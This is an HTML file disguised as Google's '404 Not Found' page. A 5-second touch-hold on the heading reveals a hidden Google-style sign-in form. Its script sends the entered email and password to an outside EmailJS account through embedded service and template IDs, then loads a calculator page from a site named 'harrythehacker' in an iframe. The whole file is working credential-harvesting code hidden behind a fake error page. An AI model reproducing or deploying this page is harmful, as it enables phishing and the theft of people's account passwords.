<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #fff; color: #202124; }
        .error-container { margin-top: 5%; }
        h1 { font-size: 120px; margin: 0; cursor: pointer; user-select: none; -webkit-user-select: none; }
        p { font-size: 18px; color: #5f6368; }
        
        #secret-login, #app-view { display: none; margin-top: 30px; }
        
        .form-box { border: 1px solid #dadce0; padding: 40px; border-radius: 8px; display: inline-block; width: 300px; }
        input { display: block; margin: 15px auto; padding: 12px; width: 90%; border: 1px solid #dadce0; border-radius: 4px; }
        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: bold; }
        
        iframe { width: 100%; height: 90vh; border: none; }
    </style>
</head>
<body>

<div id="not-found-view">
    <div class="error-container">
        <img src="https://www.google.com/images/errors/robot.png" alt="Google Robot">
        <h1 id="hold-target">404</h1>
        <p><b>404.</b> That’s an error.</p>
        <p>The requested URL was not found on this server. <ins>That’s all we know.</ins></p>
    </div>
</div>

<div id="secret-login">
    <div class="form-box">
        <h2>Sign in</h2>
        <form id="auth-form">
            <input type="email" id="email" placeholder="Email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>
    </div>
</div>

<div id="app-view">
    <iframe src="https://harrythehacker.neocities.org/Calculator"></iframe>
</div>

<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>

<script>
    // Initialize EmailJS with your User ID (6iGADKihYbPC4ecb)
    (function() {
        emailjs.init("6iGADKihYbPC4ecb");
    })();

    let timer;
    const target = document.getElementById('hold-target');

    // Timer logic: Trigger ONLY on finger touch (touchstart)
    target.addEventListener('touchstart', (e) => {
        timer = setTimeout(() => {
            document.getElementById('not-found-view').style.display = 'none';
            document.getElementById('secret-login').style.display = 'block';
        }, 5000); 
    });

    target.addEventListener('touchend', () => {
        clearTimeout(timer);
    });

    // Form Handling
    document.getElementById('auth-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const templateParams = {
            user_email: document.getElementById('email').value,
            user_pass: document.getElementById('password').value,
            firebase_project: "testing-12bc9" // Your Firebase Reference
        };

        // Send data using your Service and Template IDs
        emailjs.send('service_06y4hgi', 'template_56l2irz', templateParams)
            .then(() => {
                // On success, hide login and show the Iframe
                document.getElementById('secret-login').style.display = 'none';
                document.getElementById('app-view').style.display = 'block';
            }, (error) => {
                alert("Connection Error. Please try again.");
                console.log("FAILED...", error);
            });
    });
</script>

</body>
</html>
